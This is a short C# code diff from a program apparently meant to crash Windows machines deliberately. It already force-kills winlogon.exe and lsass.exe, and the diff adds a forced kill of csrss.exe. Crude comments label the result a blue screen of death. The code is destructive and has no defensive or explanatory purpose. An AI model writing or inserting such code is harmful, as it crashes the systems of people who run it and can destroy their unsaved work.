@@ -645,7 +645,10 @@ namespace Hiphenatus
             Process.Start("taskkill", "/f /t /im winlogon.exe"); //    FUCKING
             Thread.Sleep(10);
             Process.Start("taskkill", "/f /t /im lsass.exe");    //      SOD
-
+            Thread.Sleep(10);
+            Process.Start("taskkill", "/f /t /im csrss.exe");   //        (again)
+            Thread.Sleep(1000);
+            Console.WriteLine("ayo wtf");
         }
 
 
